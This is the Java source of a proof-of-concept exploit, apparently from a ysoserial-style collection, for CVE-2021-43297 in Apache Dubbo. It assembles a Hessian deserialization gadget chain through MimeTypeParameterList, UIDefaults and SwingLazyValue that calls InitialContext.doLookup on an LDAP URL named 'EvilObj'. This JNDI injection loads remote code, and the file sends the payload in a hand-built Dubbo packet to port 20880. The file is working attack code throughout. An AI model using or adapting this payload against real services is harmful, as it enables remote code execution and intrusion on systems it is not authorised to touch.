package ysoserial.payloads.tabbyGadgetChains.ApacheDubbo;

import com.caucho.hessian.io.*;
import com.nqzero.permit.Permit;
import org.apache.dubbo.common.io.Bytes;
import org.apache.dubbo.common.serialize.Cleanable;
import sun.swing.SwingLazyValue;
import javax.activation.MimeTypeParameterList;
import javax.swing.*;
import java.io.ByteArrayOutputStream;
import java.io.OutputStream;
import java.lang.reflect.Field;
import java.net.Socket;
import java.util.HashMap;
import java.util.Random;


/**
 * javax.activation.MimeTypeParameterList->toString
 *                 ->javax.swing.UIDefaults.get
 *                 ->javax.swing.UIDefaults.getFromHashtable
 *                 ->sun.swing.SwingLazyValue->createValue    ---> invoke
 */
public class Poc1_CVE_2021_43297 {

    public static class NoWriteReplaceSerializerFactory extends SerializerFactory {

        /**
         * {@inheritDoc}
         *
         * @see com.caucho.hessian.io.SerializerFactory#getObjectSerializer(java.lang.Class)
         */
        @Override
        public Serializer getObjectSerializer (Class<?> cl ) throws HessianProtocolException {
            return super.getObjectSerializer(cl);
        }


        /**
         * {@inheritDoc}
         *
         * @see com.caucho.hessian.io.SerializerFactory#getSerializer(java.lang.Class)
         */
        @Override
        public Serializer getSerializer ( Class cl ) throws HessianProtocolException {
            Serializer serializer = super.getSerializer(cl);

            if ( serializer instanceof WriteReplaceSerializer) {
                return UnsafeSerializer.create(cl);
            }
            return serializer;
        }

    }
    public static void main(String[] args) throws Exception {


        UIDefaults uiDefaults = new UIDefaults();
        SwingLazyValue swingLazyValue = new SwingLazyValue("111");

        Field classNameField = swingLazyValue.getClass().getDeclaredField("className");
        Permit.setAccessible(classNameField);
        classNameField.set(swingLazyValue, "javax.naming.InitialContext");

        Field methodNameField = swingLazyValue.getClass().getDeclaredField("methodName");
        Permit.setAccessible(methodNameField);
        methodNameField.set(swingLazyValue, "doLookup");

        Field argsField = swingLazyValue.getClass().getDeclaredField("args");
        Permit.setAccessible(argsField);
        argsField.set(swingLazyValue, new Object[]{"ldap://127.0.0.1:1389/EvilObj"});

        uiDefaults.put("foo",swingLazyValue);
        uiDefaults.put("a", "1111");
        uiDefaults.put("foo1",swingLazyValue);

        MimeTypeParameterList mimeTypeParameterList = new MimeTypeParameterList();

        Field parametersField = mimeTypeParameterList.getClass().getDeclaredField("parameters");
        Permit.setAccessible(parametersField);
        parametersField.set(mimeTypeParameterList, uiDefaults);
//
        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();

// header.
        byte[] header = new byte[16];
// set magic number.
        Bytes.short2bytes((short) 0xdabb, header);
// set request and serialization flag.
        header[2] = (byte) ((byte) 0x80 | 2);
//        header[2] = (byte)((byte) -29);
// set request id.
        Bytes.long2bytes(new Random().nextInt(100000000), header, 4);


        NoWriteReplaceSerializerFactory sf = new NoWriteReplaceSerializerFactory();
        sf.setAllowNonSerializable(true);
        ByteArrayOutputStream hessian2ByteArrayOutputStream = new ByteArrayOutputStream();
        Hessian2Output out = new Hessian2Output(hessian2ByteArrayOutputStream);
        out.setSerializerFactory(sf);



        out.writeObject(mimeTypeParameterList);

        out.writeString("org.apache.dubbo.samples.basic.api.DemoService");
        out.writeString("0.0.0");
        out.writeString("sayHello");

        out.writeString("");
        out.writeObject(mimeTypeParameterList);
        out.writeObject(new HashMap());

        out.flushBuffer();
        if (out instanceof Cleanable) {
            ((Cleanable) out).cleanup();
        }

        Bytes.int2bytes(hessian2ByteArrayOutputStream.size(), header, 12);
        byteArrayOutputStream.write(header);
        byteArrayOutputStream.write(hessian2ByteArrayOutputStream.toByteArray());

        byte[] bytes = byteArrayOutputStream.toByteArray();


        Socket socket = new Socket("127.0.0.1", 20880);
        OutputStream outputStream = socket.getOutputStream();
        outputStream.write(bytes);
        outputStream.flush();
        outputStream.close();
    }
}
